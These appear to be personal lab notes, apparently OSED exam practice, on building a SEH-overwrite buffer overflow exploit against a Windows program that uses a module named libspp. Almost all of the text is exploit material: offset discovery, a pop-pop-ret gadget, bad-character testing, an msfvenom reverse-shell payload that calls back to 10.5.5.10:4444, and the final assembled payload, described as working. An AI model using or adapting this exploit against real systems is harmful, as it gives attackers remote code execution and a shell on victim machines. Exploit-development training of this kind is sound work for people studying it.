send pattern:
```
/home/nathan/metasploit-framework/tools/exploit/pattern_create.rb -l 9000
```
verify:
```
 /home/nathan/metasploit-framework/tools/exploit/pattern_offset.rb -l 9000 -q 44336644
[*] Exact match at offset 2499
```
verify that:
```
payload=b"\x41" * 2499
payload+=b"\x69" * 4
payload+=b"\x43" * 5000
```
and it works. libspp is present again, with no protections. lets use it. first, verify with process hacker. then, with narly. 
```
.load narly
!nmod
```
again, it's good to use. now we find the address,
```
lm m libspp
Browse full module list
start    end        module name
10000000 10221000 
```
update the script, and search. 
```
$><C:\users\osed\desktop\poppopreturn.wds
<SNIP>
 u 0x10151720
10151720 5e              pop     esi
10151721 5d              pop     ebp
fake return. (c3)
```
now we have our address! update code to jump to it. 
turns out we found our first null byte instead, 0x20. uhg. switch to a differnet byte, code in a jump, decrease payload size by 4, and were back in business. now we know 0x20 doesn't work! lets put some shellcode in there. it can fit before or after with this amount of space. 

lets just put it in front. turns out the truncation at the end isn't our friend. 
```
payload=b"\x41" * 2495
payload+=pack("<L", (0x06eb9090)) #jmp forward 6 bytes to skip the ppr address
payload+=pack("<L", (0x101503d8)) #ppr in libspp
payload+=b"\x43" * 5000
```
null byte testing!!! 
sent with this:
```
bytearray(
b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10"
b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x30"
b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff\xf0"
)
```
ran through my script:
```
badchars = b"\x00\x09\x0a\x0d\x20\x25\x26\x2b\x3d"
```
alright! now we know them! lets generate some shellcode, but not yet jump to it. first find the offset. 

generated with:
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.5.5.10 LPORT=4444 EXITFUNC=thread -f python -v shellcode  -b "\x00\x09\x0a\x0d\x20\x25\x26\x2b\x3d"
```

looks like its only 41a away!
```
 ? 01f8be86 - esp
Evaluate expression: 1050 = 0000041a
```
so lets jump to it. 
```
 /home/nathan/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > add sp,0x41a
00000000  6681C41A04        add sp,0x41a
nasm > jmp esp
00000000  FFE4              jmp esp
```
and we have it running!!!
```
payload=shellcode
payload+=b"\x41" * (2495 - len(shellcode))

payload+=pack("<L", (0x06eb9090)) #jmp forward 6 bytes to skip the ppr address
payload+=pack("<L", (0x101503d8)) # ppr in libspp

payload+=b"\x90" * 2 #even out bytes
payload+=b"\x66\x81\xc4\x1a\x04"    #add this to sp: 6681C41A04
payload+=b"\xff\xe4" #jmp esp
payload+=b"\x43" * 5000
```
it connects back to me. yayyyy
